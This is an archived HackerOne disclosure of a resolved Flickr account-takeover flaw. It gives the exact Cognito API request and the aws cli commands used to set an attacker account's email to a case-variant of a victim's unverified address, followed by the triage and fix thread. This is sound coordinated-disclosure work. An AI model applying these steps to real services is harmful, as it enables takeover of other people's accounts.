---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-authentication-generic
  - env/cloud
  - stack/aws
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2021-12-18
submitted: 2021-09-16T23:41:34.093Z
bounty_usd: null
votes: 440
cve: []
program: "[[programs/flickr|Flickr]]"
reporter: "lauritz"
source: "https://hackerone.com/reports/1342088"
title: "Flickr Account Takeover using AWS Cognito API"
---
# Flickr Account Takeover using AWS Cognito API

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 440 | **Program:** Flickr | **Disclosed:** 2021-12-18

- Report: [https://hackerone.com/reports/1342088](https://hackerone.com/reports/1342088)
- CWE: Improper Authentication - Generic
- Submitted: 2021-09-16T23:41:34.093Z

## Report summary

I published a deep dive into this vulnerability in a blog post: https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/

Thank you very much to @alexseville and team for the kind triage, kudos for applying a preliminary fix on the day of reporting! :)

If you have any comments or questions, feel free to reach out via Twitter: https://twitter.com/_lauritz_

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Flickr uses [Amazon Cognito](https://aws.amazon.com/de/cognito/) to implement its login functionality.

Furthermore, Flickr does not allow users to change their registered e-mail address via the user interface. This restriction can be bypassed via direct communication with the Amazon Cognito *User Pool* API.

Consider we have the following accounts:
1. flickr-benign@lauritz-holtmann.de (our victim)
2. An arbitrary other account that is controlled by the attacker - in the following flickr-attacker@lauritz-holtmann.de

At first, the malicious actor needs to obtain an Amazon `access_token`. To do so, intercept the login request that is sent from https://identity.flickr.com/:
```http
POST / HTTP/2
Host: cognito-idp.us-east-1.amazonaws.com
[...]

{
    "AuthFlow":"USER_PASSWORD_AUTH",
    "ClientId":"3ck15a1ov4f0d3o97vs3tbjb52",
    "AuthParameters":{
        "USERNAME":"flickr-attacker@lauritz-holtmann.de",
        "PASSWORD":"[REDACTED]",
        "DEVICE_KEY":"us-east-1_07032954-25bf-4781-b596-9d675d901072"
    },
    "ClientMetadata":
    {                
    }
}
```

If the provided credentials for the attacker controlled account are valid, Amazon responds with tokens:
```http
HTTP/2 200 OK
Date: Thu, 16 Sep 2021 22:51:36 GMT
[...]

{
    "AuthenticationResult":    
        {
            "AccessToken":"[REDACTED]",
            "ExpiresIn":3600,
            "IdToken":"[REDACTED]",
            "RefreshToken":"[REDACTED]",
            "TokenType":"Bearer"
        },
    "ChallengeParameters":
        {            
        }
}
```

The `access_token` can be directly used against Amazon's AWS API, for instance using the [AWS Command Line Interface](https://docs.aws.amazon.com/cli/) tool:

```bash
$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]
{
    "Username": "e28c344[...]",
    "UserAttributes": [
        {
            "Name": "sub",
            "Value": "e28[...]"
        },
        {
            "Name": "birthdate",
            "Value": "1998-09-17"
        },
        {
            "Name": "email_verified",
            "Value": "true"
        },
        {
            "Name": "locale",
            "Value": "en-us"
        },
        {
            "Name": "given_name",
            "Value": "Axel"
        },
        {
            "Name": "family_name",
            "Value": "Attacker"
        },
        {
            "Name": "email",
            "Value": "flickr-attacker@lauritz-holtmann.de"
        }
    ]
}
```

Using the API, one is able to alter some of the user attributes - including the linked e-mail address:
```bash
$ aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=flickr-Benign@lauritz-holtmann.de
{
    "CodeDeliveryDetailsList": [
        {
            "Destination": "f***@l***.de",
            "DeliveryMedium": "EMAIL",
            "AttributeName": "email"
        }
    ]
}
```

Note that the registered address is **case sensitive**.
As the above output already indicates, at this stage, the e-mail address is not verified:
```bash
$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQi[...] 
{
    "Username": "e28c34[...]",
    "UserAttributes": [
        {
            "Name": "sub",
            "Value": "e2[...]"
        },
        {
            "Name": "birthdate",
            "Value": "1998-09-17"
        },
        {
            "Name": "email_verified",
            "Value": "false"
        },
        {
            "Name": "locale",
            "Value": "en-us"
        },
        {
            "Name": "given_name",
            "Value": "Axel"
        },
        {
            "Name": "family_name",
            "Value": "Attacker"
        },
        {
            "Name": "email",
            "Value": "flickr-Benign@lauritz-holtmann.de"
        }
    ]
}
```

Strikingly, it is still possible to login at Flickr using the case-sensitive, not-verified victim e-mail address using the attacker's password:
{F1451108}
As the above video illustrates, the attacker has to make sure that within the outgoing HTTP request the capitalization of the e-mail address is as intended.

## Conclusion
The aforementioned behavior can be tracked down to the following root issues
1) Flickr does not expect e-mail addresses to be changed - still it is possible to change a user's address using the AWS Cognito API.
2) Flickr does not check whether the e-mail address is verified on login
3) Flickr normalizes the e-mail address received from AWS cognito, so that collisions are possible

## Impact

Chained as shown above, the aforementioned  vulnerabilities can be used to takeover a user's account without any user interaction. 

A malicious solely needs to know the e-mail address that is linked within a victim's account to link a crafted e-mail address to their account that can then be used to takeover the victim's account.

## Further Notices
All tests were performed against my user accounts. The user account patterns used were as follows:
* lauritz+*@wearehackerone.com
* *@lauritz-holtmann.de

Please let me know if you have any comments or questions.

## Timeline

- **Report Filed**
- **2021-09-17** @alexseville: We've annotated the steps of the report by trying to reproduce, and I'm going to list them here just to understand if we've missed something:

1. Attacker finds victim’s email address: `joe+schmoe@example.com`
2. Attacker signs up for own flickr account, email may be anything
3. Attacker obtains their own access token from `identity.flickr.com`
4. Go to `identity.flickr.com/login`
5. Open dev tools, network panel, and preserve log
6. Log in
7. In the network panel there should be several calls to `cognito-idp.us-east-1.amazonaws.com` 
8. One of these calls should contain an AccessToken in the response body

9 . Attacker uses access token to change their email via aws cli
10. Choose a cased version of the victim’s email: `joe+Schmoe@example.com`
11. At this point, the attacker email becomes verified=false, but the account is still confirmed from when they verified their previous email
12. Attacker goes to log in with the malicious email and the attacker’s password
13. This won’t work right away since our UI lowercases the email
14. Use a MITM proxy to edit the email back to the correct case
15. The attacker is now logged in to their own account, not the victim’s

We don't see a method in which the access token or email case changing functionality is exposed to third parties without MITM, which is out of scope as per our program.
Can you confirm our understanding to be correct, or provide more details?

Thanks.
- **Report Needs More Info**
- **Report New**
- **2021-09-17** @alexseville: Thanks for your response.

I feel like we're getting closer to understanding each other.

It sounds like you agree that the hacker is only able to capture/modify their own traffic, and only able to login to their own account, therefore there isn't a security risk that would be in scope for our program.

Feel free to update the ticket if you can show that the access token of another user can be stolen or that you can login to someone else's account. Otherwise, you can self-close to avoid reputation loss.

Thanks for your interest in our program!
- **2021-09-17** @lauritz: Hi @alexseville,

thank you very much for your kind response. The offer to self-close this report is much appreciated.

Even though I have the feeling, too, that we are getting closer to understanding each other, I would like to highlight again, that with this vulnerability, a malicious actor can takeover - to my knowledge - every flickr account. The only thing the attacker needs to know is the used e-mail address.

I attach a screen recording of the full process of taking over **flickr-benign@lauritz-holtmann.de**, from creation of an attacker account to login into the victim account: {F1452098}

If this would help you during triage, I could also try to takeover one of your accounts as proof. 

Please let me know if you have any further comments or questions.

Best regards,
@lauritz
- **2021-09-17** @rupz0r: Hi @lauritz! Thanks for the new screen cap, that's super helpful. Here's a test account I just created, would you mind trying with this one? ruppel+benign@smugmug.com
- **Report Needs More Info**
- **Report New**
- **Report Triaged**
- **Bounty Awarded**
- **2021-09-17** @lauritz: Wow, thank you very much for the bounty!

Please let me know if I could further assist. I tried to outline the root causes to which I tracked down the issue in my initial report. 
As you use an OpenID Connect flow under the hood, I would like to add that the specification explicitly requires to only use the "sub" claim to identify a user.

Again, thanks for your kind triage. :)

Have a nice weekend and best regards,
@lauritz
- **Report Triaged**
- **2021-09-18** @alexseville: @lauritz care to try reproducing again? We've made a preliminary fix, though there are additional fixes we'll deploy through the next week.
- **2021-09-18** @lauritz: Hi @alexseville,

the preliminary fix looks good to me for now. I am not able to login using a malicious access token that is crafted as shown before via https://www.flickr.com/signin/auth?data=ey...

{F1452475}

Great work applying a fix this fast!

Have a nice weekend,
@lauritz
- **2021-09-18** @alexseville: Great, thanks for the repro, I'll award a $50 bonus for your time.

I'll update the ticket as our remediation items are covered, so for the moment we aren't going to close this issue, but we are prioritizing it highly.

Thanks again!
- **Bounty Awarded**
- **2021-09-24** @lauritz: Hi @alexseville,

I hope you are doing well :)

Since last week I did some research regarding AWS Cognito and noticed, that there are further possible Cognito-specific hardening measures that can be applied.

It is possible to write-protect user claims, such as the e-mail. If a user would then try to set a new e-mail address, this would result in the following error:
```
An error occurred (InvalidParameterException) when calling the UpdateUserAttributes operation: user.email: Attribute cannot be updated.
```

Documentation on this can be found here: https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-attributes.html#user-pool-settings-attribute-permissions-and-scopes 

Please let me know if I could further assist.

Best regards and have a nice weekend,
@lauritz
- **2021-10-08** @lauritz: Hey there,

I would like to request an update on this report. 

Thanks a lot and best regards,
Lauritz
- **2021-10-08** @alexseville: Our final fixes continue to be planned. I don't yet have an ETA on when they will be live, but we will update the ticket at that time.
- **2021-10-09** @lauritz: Thanks a lot for the update and have a nice weekend! :)
- **2021-10-31** @lauritz: Hi @alexseville,

I hope you are doing well! :)

I just wanted to let you know as soon as possible that I would love to publish a blog post on this report after it is resolved - of course only with your permission. The post would be published on my blog https://security.lauritz-holtmann.de.

There is already a draft for this post that is attached to this comment: {F1499440}{F1499441}
As you can see, the draft includes further references to best practices as well as a description on how such issues could be identified. So maybe this helps for your remediation, too.

Please let me know what you think about this.


Thank you very much for your effort and best regards,
@lauritz
- **2021-11-03** @alexseville: Hi @lauritz ,

That's a great blog post!

We're anticipating completing the final fixes early next week. We're happy to consent to disclosure (you can also request it through the H1 interface if you'd like) for this issue, but would like to ask that you could wait until the final fixes are completed. Often when an exploit becomes public, other researchers come to try and test the fix, so we want to be prepared.

Thanks again!
- **2021-11-11** @lauritz: Hi @alexseville,

I just wanted to retest this report before coming back to you and noticed that the sign-up appears to be broken at the moment.

If I register a user, I get the following error message after confirming the e-mail address and performing the initial login: {F1511104}

Apparently, the user is not registered at Cognito:
```bash
$ aws cognito-idp get-user --region us-east-1 --access-token [REDACTED-JWT]

An error occurred (UserNotFoundException) when calling the GetUser operation: User does not exist.
```

If you are applying your fixes in this exact moment, ignore this message. Otherwise, the applied fix may have broken sensitive functionality.

Do not hesitate to reach out in case you have any comment or questions!

Best regards,
@lauritz
- **2021-11-16** @lauritz: Hey there,

I noticed that the registration works again. However, I also noticed that it is still possible to write the `email` claim via the *aws cli*. Is this the final state of fixes and hardening you were referring to two weeks ago, or do you plan to implement further measures to harden the login and registration flow? 
From my perspective, the current state behaves comparable to the preliminary fixes applied on September 18th. 

Thank you very much for your consent regarding the disclosure! :) I will formally request disclosure via the platform once this report is marked as resolved here at H1 (in the current state I do not have this option available).

Please let me know if I could further assist. 

Best regards,
@lauritz
- **2021-11-30** @lauritz: Hi @alexseville an team,

I hope this message finds you all well! :)

I am very sorry to bother you again, but would like to request another update. 🙈
If the issue is resolved from your side, would you mind adjusting the status on H1? 

Otherwise, if you need further time for remediation or have additional comments, please let me know. 

Thank you very much for your effort and best regards, 
@lauritz
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
